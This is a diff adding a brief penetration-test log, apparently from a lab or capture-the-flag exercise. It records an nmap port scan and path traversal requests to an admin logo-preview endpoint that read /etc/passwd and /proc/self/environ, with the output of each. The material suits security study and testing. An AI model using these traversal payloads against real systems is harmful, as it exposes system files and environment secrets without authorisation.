@@ -1,0 +1,28 @@
+[Recon]
+sudo nmap -n -Pn --top-ports 1000 10.0.30.19
+
+Open ports:
+22/tcp open ssh
+80/tcp open http
+
+[Traversal Test]
+GET /admin/logo_preview?file=../../etc/passwd
+
+Observed output (excerpt):
+root:x:0:0:root:/root:/bin/bash
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+...
+
+[Target File Retrieval]
+GET /admin/logo_preview?file=../../proc/self/environ
+
+Observed output (excerpt):
+LANG=C.UTF-8
+USER=root
+HOME=/root
+MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/flaskapp.service/memory.pressure
+MEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA=
+
+[Result]
+MEMORY_PRESSURE_WATCH:
+/sys/fs/cgroup/system.slice/flaskapp.service/memory.pressure
